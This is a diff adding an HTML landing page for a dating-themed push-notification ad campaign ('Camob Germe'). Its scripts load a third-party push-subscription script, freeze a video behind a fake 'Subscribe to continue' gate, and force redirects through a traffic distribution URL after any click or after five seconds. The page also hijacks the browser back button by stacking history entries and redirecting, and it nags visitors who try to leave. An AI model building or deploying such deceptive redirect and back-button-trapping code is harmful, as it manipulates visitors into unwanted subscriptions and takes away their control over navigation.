@@ -1,0 +1,164 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Dating Land - Camob Germe</title>
+    <style>
+        html, body {
+            margin: 0;
+            padding: 0;
+            width: 100%;
+            height: 100%;
+            overflow: hidden;
+            font-family: Arial, sans-serif;
+            background-color: #000;
+        }
+        #videoContainer {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            overflow: hidden;
+            z-index: 1;
+        }
+        #myVideo {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            min-width: 100%;
+            min-height: 100%;
+            width: auto;
+            height: auto;
+            transform: translate(-50%, -50%);
+            object-fit: cover;
+        }
+        #overlay {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(to bottom, rgba(0,0,0,0.4), rgba(0,0,0,0.8));
+            z-index: 2;
+            opacity: 0;
+            transition: opacity 0.5s ease;
+        }
+        #overlay.show {
+            opacity: 1;
+        }
+        #subscribeBtn {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%) scale(0);
+            padding: 18px 36px;
+            font-size: 26px;
+            color: #fff;
+            background-color: rgba(255, 0, 150, 0.9);
+            border: 2px solid #fff;
+            border-radius: 12px;
+            cursor: pointer;
+            z-index: 3;
+            opacity: 0;
+            transition: transform 0.5s ease, opacity 0.5s ease;
+            white-space: nowrap;
+        }
+        #subscribeBtn.show {
+            transform: translate(-50%, -50%) scale(1);
+            opacity: 1;
+        }
+    </style>
+</head>
+<body>
+
+<div id="videoContainer">
+    <video id="myVideo" autoplay muted playsinline loop>
+        <source src="https://cdn.pixabay.com/video/2024/02/25/201545-917327263_large.mp4" type="video/mp4">
+    </video>
+    <div id="overlay"></div>
+    <div id="subscribeBtn">Subscribe to continue</div>
+</div>
+
+<script>
+    // CAMOB GERME - ПО ОФИЦИАЛЬНОЙ ДОКЕ TACOLO
+    // Binom: https://datingland.site/germe/?click_id={clickid}&sub_id=camob
+    
+    const urlParams = new URLSearchParams(window.location.search);
+    const clickId = urlParams.get('click_id') || 'no_clickid';  // для Tacolo
+    const subId = urlParams.get('sub_id') || 'camob';           // camob
+    
+    console.log('Camob ClickID:', clickId, 'SubID:', subId);
+    
+    // TACOLO PS.JS
+    (function() {
+        const s = document.createElement('script');
+        s.src = `https://wpcpc.sjscdn.com/ps/ps.js?id=j-DQEhxgKEueEzYw3M-eJQ&click_id=${encodeURIComponent(clickId)}`;
+        s.async = true;
+        document.head.appendChild(s);
+    })();
+
+    // TDS С CAMOB
+    const tdsUrl = `https://hotbjayapa.today/tds?id=1556189731&p1=${encodeURIComponent(clickId)}&p2=${encodeURIComponent(subId)}&p3=sub3&p4=sub4`;
+    const chatUrl = 'https://datingland.site/chat';
+    const backUrl = 'https://hotbjayapa.today/tds?id=1556189731&p1=camob&p2=sub2&p3=sub3&p4=sub4';
+
+    let isDone = false;
+
+    function goToTDS() {
+        if (isDone) return;
+        isDone = true;
+        window.location.replace(tdsUrl);
+    }
+
+    function clickAction() {
+        if (isDone) return;
+        isDone = true;
+        window.open(tdsUrl, '_blank');
+        setTimeout(() => window.location.replace(chatUrl), 100);
+    }
+
+    // TACOLO CALLBACKS
+    window.onPermissionDefault = () => goToTDS();
+    window.onPermissionDenied = () => goToTDS();
+    window.onPermissionAllowed = () => goToTDS();
+    window.onAlreadySubscribed = () => goToTDS();
+    window.onNotificationUnsupported = () => goToTDS();
+    window.onTrafficFiltered = () => goToTDS();
+</script>
+
+<script>
+    setTimeout(() => { if (!isDone) goToTDS(); }, 5000);
+    
+    window.onbeforeunload = () => {
+        if (!isDone) return "Are you sure you want to leave?";
+    };
+
+    const video = document.getElementById('myVideo');
+    const btn = document.getElementById('subscribeBtn');
+    const overlay = document.getElementById('overlay');
+
+    video.addEventListener('playing', () => {
+        setTimeout(() => {
+            video.pause();
+            overlay.classList.add('show');
+            btn.classList.add('show');
+        }, 100);
+    }, { once: true });
+
+    btn.addEventListener('click', (e) => { e.preventDefault(); clickAction(); });
+    video.addEventListener('click', (e) => { e.preventDefault(); clickAction(); });
+
+    // BACK BUTTON
+    (function() {
+        for (let i = 0; i < 3; i++) history.pushState(null, null, location.href);
+        window.addEventListener('popstate', () => {
+            history.pushState(null, null, location.href);
+            window.location.replace(backUrl);
+        });
+    })();
+</script>
+
+</body>
+</html>
